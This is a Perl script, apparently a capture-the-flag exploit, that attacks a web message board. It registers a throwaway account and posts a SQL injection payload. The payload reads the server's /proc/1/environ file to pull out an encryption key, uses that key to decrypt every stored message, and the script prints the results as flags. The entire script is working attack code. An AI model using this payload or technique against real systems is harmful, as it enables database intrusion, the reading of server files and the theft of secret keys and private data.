#!/usr/bin/perl

use Mojo::Base -strict;

use Mojo::UserAgent;

my $sploit = <<'EOF';
-' || (select string_agg(m, ',') from (select pgp_sym_decrypt(data, (select substring(encode(pg_read_binary_file('/proc/1/environ', 0, 1024), 'escape') from 'ENC_KEY=(\w+)'))) m from messages) x) || '-
EOF

my $url = Mojo::URL->new(shift // 'http://127.0.0.1:8080');
my $ua = Mojo::UserAgent->new(max_redirects => 3);
my $tx;

my $login = 'sploit_' . rand;

$url->path('/register');
$tx = $ua->post($url => form => {login => $login, password => $login});

$url->path('/messages/board/1');
$tx = $ua->post($url => form => {message => $sploit});
$tx = $ua->get($url);

my $res = $tx->result;
my $flags = $res->dom->find('.message.s8 span')->map('text')->join('\n');
print $flags;
